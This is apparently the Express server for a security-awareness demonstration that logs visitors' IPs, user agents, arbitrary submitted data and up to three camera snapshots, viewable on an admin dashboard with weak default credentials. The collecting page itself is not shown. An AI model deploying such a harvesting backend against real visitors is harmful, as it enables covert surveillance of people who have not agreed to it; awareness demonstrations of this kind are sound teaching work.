require('dotenv').config();
const express = require('express');
const session = require('express-session');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Store collected data in memory (resets on server restart)
let collectedData = [];
let demoActive = true;

// Admin credentials (change these in .env file)
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'security123';
const SESSION_SECRET = process.env.SESSION_SECRET || 'change-this-secret-key';

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 3600000 } // 1 hour
}));

// Helper to get client IP
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
           req.connection?.remoteAddress ||
           req.ip || 'Unknown';
}

// Auth middleware
function requireAuth(req, res, next) {
    if (req.session.isAdmin) {
        next();
    } else {
        res.redirect('/admin/login');
    }
}

// ============ PUBLIC ROUTES ============

// Main demo page
app.get('/', (req, res) => {
    if (!demoActive) {
        return res.render('closed');
    }
    const visitorIP = getClientIP(req);
    const timestamp = new Date().toISOString();
    res.render('demo', { visitorIP, timestamp });
});

// API: Check if demo is active
app.get('/api/status', (req, res) => {
    res.json({ active: demoActive });
});

// API: Receive collected data
app.post('/api/collect', (req, res) => {
    if (!demoActive) {
        return res.json({ success: false, message: 'Demo session closed' });
    }

    const data = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        ip: getClientIP(req),
        userAgent: req.headers['user-agent'],
        ...req.body
    };

    collectedData.push(data);
    console.log(`[DATA] Collected from ${data.ip} at ${data.timestamp}`);

    res.json({ success: true, message: 'Data recorded for demonstration' });
});

// API: Receive camera snapshot
app.post('/api/snapshot', (req, res) => {
    if (!demoActive) {
        return res.json({ success: false });
    }

    const { visitorId, image } = req.body;

    // Find existing entry and add snapshot
    const entry = collectedData.find(d => d.visitorId === visitorId);
    if (entry) {
        if (!entry.snapshots) entry.snapshots = [];
        if (entry.snapshots.length < 3) { // Limit to 3 snapshots
            entry.snapshots.push({
                time: new Date().toISOString(),
                image: image
            });
        }
    }

    res.json({ success: true });
});

// ============ ADMIN ROUTES ============

// Admin login page
app.get('/admin/login', (req, res) => {
    if (req.session.isAdmin) {
        return res.redirect('/admin');
    }
    res.render('login', { error: null });
});

// Admin login handler
app.post('/admin/login', (req, res) => {
    const { username, password } = req.body;

    if (username === ADMIN_USER && password === ADMIN_PASS) {
        req.session.isAdmin = true;
        res.redirect('/admin');
    } else {
        res.render('login', { error: 'Invalid credentials' });
    }
});

// Admin logout
app.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin/login');
});

// Admin dashboard
app.get('/admin', requireAuth, (req, res) => {
    res.render('admin', {
        data: collectedData,
        demoActive: demoActive,
        totalVisitors: collectedData.length
    });
});

// API: Toggle demo session
app.post('/admin/toggle-demo', requireAuth, (req, res) => {
    demoActive = !demoActive;
    console.log(`[ADMIN] Demo session ${demoActive ? 'STARTED' : 'STOPPED'}`);
    res.json({ active: demoActive });
});

// API: Clear all data
app.post('/admin/clear-data', requireAuth, (req, res) => {
    const count = collectedData.length;
    collectedData = [];
    console.log(`[ADMIN] Cleared ${count} records`);
    res.json({ success: true, cleared: count });
});

// API: Get data as JSON (for refresh)
app.get('/admin/api/data', requireAuth, (req, res) => {
    res.json({
        data: collectedData,
        demoActive: demoActive,
        totalVisitors: collectedData.length
    });
});

// ============ START SERVER ============

app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════════╗
║       SECURITY AWARENESS DEMONSTRATION TOOL                ║
║                  FOR EDUCATIONAL USE ONLY                  ║
╠════════════════════════════════════════════════════════════╣
║  Server running on: http://localhost:${PORT}                  ║
║  Admin dashboard:   http://localhost:${PORT}/admin            ║
║                                                            ║
║  Default login:     admin / security123                    ║
║  (Change in .env file for production)                      ║
╚════════════════════════════════════════════════════════════╝
    `);
});
